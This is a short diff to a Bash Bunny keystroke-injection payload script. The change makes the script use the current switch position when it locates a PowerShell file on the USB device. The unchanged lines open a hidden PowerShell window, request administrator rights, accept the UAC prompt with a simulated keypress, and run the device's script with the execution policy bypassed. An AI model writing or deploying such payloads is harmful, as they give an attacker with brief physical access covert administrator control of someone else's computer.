@@ -25,7 +25,7 @@ RUN WIN "powershell -windowstyle hidden start-process powershell -verb RunAs"
 sleep 3
 Q ALT Y
 sleep 2
-Q STRING "\$src = (gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\switch1\p.ps1'"
+Q STRING "\$src = (gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\p.ps1'"
 Q ENTER
 sleep 1
 QUACK STRING "powershell -ep bypass \$src"
